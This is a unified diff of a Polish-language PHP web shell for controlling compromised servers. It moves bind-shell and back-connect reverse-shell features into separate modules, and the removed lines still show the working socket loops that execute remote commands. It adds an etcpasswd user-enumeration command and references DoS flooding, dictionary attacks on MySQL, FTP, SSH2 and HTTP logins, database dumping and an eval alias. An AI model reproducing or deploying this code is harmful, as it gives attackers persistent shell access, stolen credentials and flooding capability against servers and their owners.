@@ -14,6 +14,8 @@ require_once dirname( __FILE__ ) . '/Lib/ModuleMysqlDumper.php';
 require_once dirname( __FILE__ ) . '/Lib/ModulePasswordRecovery.php';
 require_once dirname( __FILE__ ) . '/Lib/ModuleDos.php';
 require_once dirname( __FILE__ ) . '/Lib/ModuleProxy.php';
+require_once dirname( __FILE__ ) . '/Lib/ModuleBind.php';
+require_once dirname( __FILE__ ) . '/Lib/ModuleBackConnect.php';
 
 /**
  * class Shell - Zarzadzanie serwerem
@@ -29,7 +31,7 @@ class Shell
 	/**
 	 * Wersja
 	 */
-	const VERSION = '0.2 b110603';
+	const VERSION = '0.2 b110604';
 
 	/**
 	 * Czas generowania strony
@@ -129,6 +131,22 @@ class Shell
 	private $sPhpInfo;
 
 	/**
+	 * Lista dostepnych modulow
+	 *
+	 * @access private
+	 * @var    array
+	 */
+	private $aModules = array
+	(
+		'Dos',
+		'MysqlDumper',
+		'PasswordRecovery',
+		'Proxy',
+		'Bind',
+		'BackConnect'
+	);
+
+	/**
 	 * Konstruktor
 	 *
 	 * @uses   Request
@@ -206,11 +224,28 @@ DATA;
 			$this -> aDisableFunctions = $aDisableFunctions;
 		}
 
+
+		/**
+		 * Sprawdzanie, czy wszystkie moduly zostaly juz wczytane
+		 */
+		$iModules = 0;
+
+		foreach( $this -> aModules as $sModule )
+		{
+			if( class_exists( $sModule ) )
+			{
+				$iModules++;
+			}
+		}
+
 		/**
 		 * Wczytywanie modulow
 		 */
 		$sKey = sha1( __FILE__ );
-		if( is_file( $sFilePath = sys_get_temp_dir() . '/' . $sKey ) && ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
+		if(    ( $iModules !== count( $this -> aModules ) )
+		    && is_file( $sFilePath = sys_get_temp_dir() . '/' . $sKey )
+		    && ( ( $sData = file_get_contents( $sFilePath ) ) !== FALSE )
+		)
 		{
 			$iDataLen = strlen( $sData );
 
@@ -856,9 +891,19 @@ DATA;
 		/**
 		 * Sprawdzanie, czy meoduly nie zostaly juz zaladowane
 		 */
-		if( class_exists( 'Dos' ) && class_exists( 'MysqlDumper' ) && class_exists( 'PasswordRecovery' ) && class_exists( 'Proxy' ) )
+		$iModules = 0;
+
+		foreach( $this -> aModules as $sModule )
 		{
-			return 'Wszystkie moduły zostały już załadowane';
+			if( class_exists( $sModule ) )
+			{
+				$iModules++;
+			}
+		}
+
+		if( $iModules === count( $this -> aModules ) )
+		{
+			return 'Wszystkie moduły zostały załadowane';
 		}
 
 		/**
@@ -1341,6 +1386,88 @@ DATA;
 	}
 
 	/**
+	 * Komenda - etcpasswd
+	 *
+	 * @access private
+	 * @return string
+	 */
+	private function getCommandEtcPasswd()
+	{
+		/**
+		 * Help
+		 */
+		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
+		{
+			return <<<DATA
+etcpasswd - Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix_getpwuid
+
+	Użycie:
+		etcpasswd
+
+		etcpasswd [limit_dolny] [limit_górny]
+
+	Przykład:
+
+		etcpasswd
+		etcpasswd 1000 2000
+DATA;
+		}
+
+		/**
+		 * Nie mozemy uruchomic tego na windowsie
+		 */
+		if( $this -> bWindows )
+		{
+			return 'Nie można uruchomić tego na windowsie';
+		}
+
+		/**
+		 * funkcja posix_getpwuid musi istniec
+		 */
+		if( $this -> bFuncOwnerById )
+		{
+			return 'Funkcja "posix_getpwuid" nie istnieje';
+		}
+
+		/**
+		 * Dolny zakres
+		 */
+		if( isset( $this -> aArgv[0] ) && ( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65534 ) ) )
+		{
+			return 'Błędny zakres dolny';
+		}
+
+		/**
+		 * Gorny zakres
+		 */
+		if( isset( $this -> aArgv[1] ) && ( ( $this -> aArgv[0] > $this -> aArgv[1] ) || ( $this -> aArgv[1] > 65534 ) ) )
+		{
+			return 'Błędny zakres górny';
+		}
+
+		$sOutput = NULL;
+
+		$iMin = ( isset( $this -> aArgv[0] ) ? $this -> aArgv[0] : 0 );
+		$iMax = ( isset( $this -> aArgv[1] ) ? $this -> aArgv[1] : 65535 );
+
+		/**
+		 * Iteracja
+		 */
+		for( $i = $iMin; $i <= $iMax; $i++ )
+		{
+			if( ( $aUser = posix_getpwuid( $i ) ) !== FALSE)
+			{
+				/**
+				 * Wzor jak dla pliku /etc/passwd
+				 */
+				$sOutput .= sprintf( "%s:%s:%d:%d:%s:%s:%s\r\n", $aUser['name'], $aUser['passwd'], $aUser['uid'], $aUser['gid'], $aUser['gecos'], $aUser['dir'], $aUser['shell'] );
+			}
+		}
+
+		return $sOutput;
+	}
+
+	/**
 	 * Komenda - mysql
 	 *
 	 * @access private
@@ -1479,7 +1606,7 @@ DATA;
 		 */
 		if( ! class_exists( 'MysqlDumper' ) )
 		{
-			return 'mysqldump, mysqldumper, mysqlbackup, dumpdb - !!! moduł nie został załadowany';
+			return 'mysqldump, mysqldumper, mysqlbackup - !!! moduł nie został załadowany';
 		}
 
 		/**
@@ -1487,8 +1614,9 @@ DATA;
 		 */
 		if( ( $this -> iArgc < 3 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
+			$sVersion = MysqlDumper::VERSION;
 			return <<<DATA
-mysqldump, mysqldumper, mysqlbackup, dumpdb - Kopia bazy danych MySQL
+mysqldump, mysqldumper, mysqlbackup (v.{$sVersion}) - Kopia bazy danych MySQL
 
 	Użycie:
 		mysqldump host:port login@hasło nazwa_bazy [tabela1] [tabela2]
@@ -1563,12 +1691,21 @@ DATA;
 	private function getCommandBackConnect()
 	{
 		/**
+		 * Czy modul jest zaladowany
+		 */
+		if( ! class_exists( 'BackConnect' ) )
+		{
+			return 'backconnect, bc - !!! moduł nie został załadowany';
+		}
+
+		/**
 		 * Help
 		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
+			$sVersion = BackConnect::VERSION;
 			return <<<DATA
-backconnect, bc - Połączenie zwrotne
+backconnect, bc (v.{$sVersion}) - Połączenie zwrotne
 
 	Klient (shell) łączy się pod wskazany adres dając dostęp do powłoki
 
@@ -1589,44 +1726,23 @@ DATA;
 
 		$aHost = $this -> getHost( $this -> aArgv[0] );
 
-		/**
-		 * Port jest wymagany
-		 */
-		if( $aHost[1] === 0 )
+		try
 		{
-			return sprintf( 'Błędny host "%s"', $this -> aArgv[0] );
+			ob_start();
+
+			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
+
+			$oProxy = new BackConnect( $this );
+			$oProxy -> setHost( $aHost[0] )
+				-> setPort( $aHost[1] )
+				-> get();
+			ob_end_flush();
+			exit ;
 		}
-
-		/**
-		 * Polaczenie z hostem
-		 */
-		if( ! ( $rSock = fsockopen( $aHost[0], $aHost[1] ) ) )
+		catch( BackConnectException $oException )
 		{
-			return sprintf( 'Nie można połączyć się z serwerem "%s"', $this -> aArgv[0] );
-		}
-
-		fwrite( $rSock, $sTitle = sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
-
-		/**
-		 * BC
-		 */
-		for(;;)
-		{
-			if( ( $sCmd = fread( $rSock, 1024 ) ) !== FALSE )
-			{
-				$sCmd = rtrim( $sCmd );
-				if( $sCmd === ':exit' )
-				{
-					fwrite( $rSock, "\r\nbye ;)" );
-					fclose( $rSock );
-
-					echo 'Zakończono backconnect';
-					exit ;
-				}
-
-				fwrite( $rSock, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
-				fwrite( $rSock, "\r\nroot#" );
-			}
+			header( 'Content-Type: text/html; charset=utf-8', TRUE );
+			return $oException -> getMessage();
 		}
 	}
 
@@ -1639,12 +1755,21 @@ DATA;
 	private function getCommandBind()
 	{
 		/**
+		 * Czy modul jest zaladowany
+		 */
+		if( ! class_exists( 'Bind' ) )
+		{
+			return 'bind - !!! moduł nie został załadowany';
+		}
+
+		/**
 		 * Help
 		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
+			$sVersion = Bind::VERSION;
 			return <<<DATA
-bind - Dostęp do powłoki na danym porcie
+bind (v.{$sVersion}) - Dostęp do powłoki na danym porcie
 
 	Użycie:
 		bind port
@@ -1661,173 +1786,23 @@ bind - Dostęp do powłoki na danym porcie
 DATA;
 		}
 
-		/**
-		 * Rozszerzenie "sockets" jes wymagane
-		 */
-		if( ! function_exists( 'socket_create' ) )
+		try
 		{
-			return 'Brak rozszerzenia "sockets"';
-		}
+			ob_start();
 
-		/**
-		 * Sprawdzanie poprawnosci portu
-		 */
-		if( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65535 ) )
+			header( 'Content-Type: text/plain; charset=utf-8', TRUE );
+
+			$oProxy = new Bind( $this );
+			$oProxy -> setPort( $this -> aArgv[0] )
+				-> get();
+			ob_end_flush();
+			exit ;
+		}
+		catch( BindException $oException )
 		{
-			return sprintf( 'Błędny port "%d"', $this -> aArgv[0] );
+			header( 'Content-Type: text/html; charset=utf-8', TRUE );
+			return $oException -> getMessage();
 		}
-
-		/**
-		 * Tworzenie socketa
-		 */
-		if( ! ( $rSock = socket_create( AF_INET, SOCK_STREAM, getProtoByName( 'tcp ' ) ) ) )
-		{
-			return 'Nie można utworzyć połączenia';
-		}
-
-		/**
-		 * Bindowanie
-		 */
-		if( ! ( socket_bind( $rSock, '0.0.0.0', $this -> aArgv[0] ) ) )
-		{
-			return sprintf( 'Nie można zbindować "0.0.0.0:%d"', $this -> aArgv[0] );
-		}
-
-		if( ! ( socket_listen( $rSock ) ) )
-		{
-			return sprintf( 'Nie można nasłuchiwać "0.0.0.0:%d"', $this -> aArgv[0] );
-		}
-
-		$bConnected = FALSE;
-
-		/**
-		 * bind
-		 */
-		for(;;)
-		{
-			/**
-			 * Klient
-			 */
-			if( ! ( $rClient = socket_accept( $rSock ) ) )
-			{
-				usleep( 10000 );
-			}
-			else
-			{
-				/**
-				 * Naglowek
-				 */
-				if( ! $bConnected )
-				{
-					socket_write( $rClient, sprintf( "Shell @ %s (%s)\r\n%s\r\nroot#", Request::getServer( 'HTTP_HOST' ), Request::getServer( 'SERVER_ADDR' ), php_uname() ) );
-					$bConnected = TRUE;
-				}
-
-				/**
-				 * Komenda
-				 */
-				for(;;)
-				{
-					if( ( $sCmd = rtrim( socket_read( $rClient, 1024, PHP_NORMAL_READ ) ) ) )
-					{
-						if( $sCmd === ':exit' )
-						{
-							socket_write( $rClient, "\r\nDobranoc ;)" );
-							socket_close( $rSock );
-							socket_close( $rClient );
-
-							echo 'Zakończono bindowanie';
-							exit ;
-						}
-
-						socket_write( $rClient, strtr( $this -> getActionBrowser( $sCmd ), array( "\r\n" => "\r\n", "\r" => "\r\n", "\n" => "\r\n") ) );
-						socket_write( $rClient, "\r\nroot#" );
-					}
-				}
-			}
-		}
-	}
-
-	/**
-	 * Komenda - etcpasswd
-	 *
-	 * @access private
-	 * @return string
-	 */
-	private function getCommandEtcPasswd()
-	{
-		/**
-		 * Help
-		 */
-		if( ( $this -> iArgc === 1 ) && ( $this -> aArgv[0] === 'help' ) )
-		{
-			return <<<DATA
-etcpasswd - Próba pobrania struktury pliku /etc/passwd za pomocą funkcji posix_getpwuid
-
-	Użycie:
-		etcpasswd
-
-		etcpasswd [limit_dolny] [limit_górny]
-
-	Przykład:
-
-		etcpasswd
-		etcpasswd 1000 2000
-DATA;
-		}
-
-		/**
-		 * Nie mozemy uruchomic tego na windowsie
-		 */
-		if( $this -> bWindows )
-		{
-			return 'Nie można uruchomić tego na windowsie';
-		}
-
-		/**
-		 * funkcja posix_getpwuid musi istniec
-		 */
-		if( $this -> bFuncOwnerById )
-		{
-			return 'Funkcja "posix_getpwuid" nie istnieje';
-		}
-
-		/**
-		 * Dolny zakres
-		 */
-		if( isset( $this -> aArgv[0] ) && ( ( $this -> aArgv[0] < 0 ) || ( $this -> aArgv[0] > 65534 ) ) )
-		{
-			return 'Błędny zakres dolny';
-		}
-
-		/**
-		 * Gorny zakres
-		 */
-		if( isset( $this -> aArgv[1] ) && ( ( $this -> aArgv[0] > $this -> aArgv[1] ) || ( $this -> aArgv[1] > 65534 ) ) )
-		{
-			return 'Błędny zakres górny';
-		}
-
-		$sOutput = NULL;
-
-		$iMin = ( isset( $this -> aArgv[0] ) ? $this -> aArgv[0] : 0 );
-		$iMax = ( isset( $this -> aArgv[1] ) ? $this -> aArgv[1] : 65535 );
-
-		/**
-		 * Iteracja
-		 */
-		for( $i = $iMin; $i <= $iMax; $i++ )
-		{
-			if( ( $aUser = posix_getpwuid( $i ) ) !== FALSE)
-			{
-				/**
-				 * Wzor jak dla pliku /etc/passwd
-				 */
-				$sOutput .= sprintf( "%s:%s:%d:%d:%s:%s:%s\r\n", $aUser['name'], $aUser['passwd'], $aUser['uid'], $aUser['gid'], $aUser['gecos'], $aUser['dir'], $aUser['shell'] );
-			}
-		}
-
-		return $sOutput;
 	}
 
 	/**
@@ -1851,8 +1826,9 @@ DATA;
 		 */
 		if( ( $this -> iArgc !== 4 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
+			$sVersion = PasswordRecovery::VERSION;
 			return <<<DATA
-passwordrecovery, pr - Odzyskiwanie haseł, atak słownikowy na mysql, ftp, ssh2 oraz http
+passwordrecovery, pr (v.{$sVersion}) - Odzyskiwanie haseł, atak słownikowy na mysql, ftp, ssh2 oraz http
 
 	Typ:
 		mysql
@@ -1914,8 +1890,9 @@ DATA;
 		 */
 		if( ( $this -> iArgc !== 1 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
+			$sVersion = Proxy::VERSION;
 			return <<<DATA
-proxy - Proxy HTTP
+proxy (v.{$sVersion}) - Proxy HTTP
 
 	Proxy nie ma wielowątkowości, i ma poblemy z flushowaniem !!!
 	Należy zmienić ilość polaczeń do serwera
@@ -1984,8 +1961,9 @@ DATA;
 		 */
 		if( ( $this -> iArgc !== 3 ) || ( $this -> aArgv[0] === 'help' ) )
 		{
+			$sVersion = Dos::VERSION;
 			return <<<DATA
-dos - Denial Of Service - wysyłanie losowych danych na protokoły tcp, udp i http
+dos (v.{$sVersion}) - Denial Of Service - floodowanie tcp, udp i http
 
 	Typ:
 		tcp
@@ -2069,7 +2047,7 @@ Changelog:
 	<strong>dos</strong>
 	<strong>passwordrecovery</strong>
 	<strong>cr3d1ts</strong>
-* możliwość wczytania danego modułu (Dos, PasswordRecovery, MysqlDump, 	Proxy)
+* możliwość wczytania danego modułu (Dos, PasswordRecovery, MysqlDump, Proxy, Bing, BackConnect)
 * polecenie <strong>g4m3</strong> oraz <strong>cr3d1ts</strong> nie wyświetlają się w help'ie (&#069;&#097;&#115;&#116;&#101;&#114;&#032;&#101;&#103;&#103;)
 * <strong>php</strong> jest aliasem dla <strong>eval</strong>
 
@@ -2238,10 +2216,10 @@ DATA;
 	 * @uses   Request
 	 * @uses   Form
 	 *
-	 * @access private
+	 * @access public
 	 * @return string
 	 */
-	private function getActionBrowser( $sCmd = NULL )
+	public function getActionBrowser( $sCmd = NULL )
 	{
 		$bRaw = ( $sCmd !== NULL );
 
@@ -2393,13 +2371,15 @@ DATA;
 				case 'ftpput':
 					$sConsole = $this -> getCommandFtpUpload();
 					break ;
+				case 'etcpasswd':
+					$sConsole = $this -> getCommandEtcPasswd();
+					break ;
 				case 'mysql':
 					$sConsole = $this -> getCommandMysql();
 					break ;
 				case 'mysqldump':
 				case 'mysqldumper':
 				case 'mysqlbackup':
-				case 'dumpdb':
 					$sConsole = $this -> getCommandMysqlDump();
 					break ;
 				case 'backconnect':
@@ -2408,9 +2388,6 @@ DATA;
 					break ;
 				case 'bind':
 					$sConsole = $this -> getCommandBind();
-					break ;
-				case 'etcpasswd':
-					$sConsole = $this -> getCommandEtcPasswd();
 					break ;
 				case 'proxy':
 					$sConsole = $this -> getCommandProxy();
